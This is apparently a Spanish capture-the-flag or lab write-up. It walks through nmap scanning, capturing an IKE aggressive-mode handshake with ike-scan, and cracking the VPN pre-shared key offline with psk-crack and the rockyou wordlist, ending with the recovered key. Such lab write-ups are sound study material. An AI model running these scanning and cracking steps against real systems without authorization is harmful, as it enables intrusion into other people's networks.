Empezaremos realizando un escaneo con [[NMAP]] en el cual encontramos abierto el purto `22/tcp` y el puerto `500/udp`
`nmap -sSCV -p- --open --min-rate 5000 -n -Pn -vvv <IP>`
`nmap -sU -p- --open --min-rate 5000 -n -Pn -vvv <IP>`

En el puerto `500` hay un servicio `ISAKMP Internet Security Association and Key Management Protocol`
Usaremos [[IKE-SCAN]] es una utilidad de línea de comandos para descubrir, identificar (fingerprint) y recopilar información de hosts que hablan IKE (Internet Key Exchange)

Ejecutaremos el siguiente comando:
`ike-scan --aggressive --pskcrack=psk.params`
`--aggresive` -> Envía identidades y parámetros en los primeros mensajes, sin esperar un handshake completo.
`--pskcrack` -> Captura el handshake en Aggressive Mode y lo guarda en `psk.params`

Usaremos [[PSK-CRACK]] Su objetivo principal es intentar adivinar la Pre-Shared Key (PSK)
`psk-crack -d /usr/share/wordlists/rockyou.txt psk.params`
Con `-d` seleccionaremos la wordlist y a continuacion le pasaremos el archivo generado anteriormente.

Nos devolvera la password:
`key "freakingrockstarontheroad" matches SHA1 hash 9acd999de926d953c088daf7b69efcfdecbd1893`



